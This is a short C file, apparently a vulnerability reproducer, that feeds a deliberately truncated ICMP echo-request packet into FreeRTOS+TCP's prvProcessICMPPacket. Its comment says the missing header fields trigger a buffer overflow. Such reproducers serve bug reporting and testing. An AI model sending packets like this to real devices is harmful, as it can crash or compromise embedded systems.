#include "FreeRTOS.h"
#include "list.h"
#include "task.h"
#include "FreeRTOS_IP.h"
#include "FreeRTOS_IP_Private.h"

eFrameProcessingResult_t prvProcessICMPPacket( ICMPPacket_t * const pxICMPPacket );

char data[] =
   // Ethernet header
   "\0\0\0\0\0\0\0\0\0\0\0\0\0\0"
   // IP header
   "\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0"
   // ICMP header
   "\x8"    // Type of message -- echo request
   // Leaving out subsequent fields results in a buffer overflow
   // "\0"    // Type of service
   // "\0\0"  // Checksum
   // "\0\0"  // Identifier
   // "\0\0"  // Sequence number
   ;

int main()
{
   eFrameProcessingResult_t result = prvProcessICMPPacket ((ICMPPacket_t *)data);
}
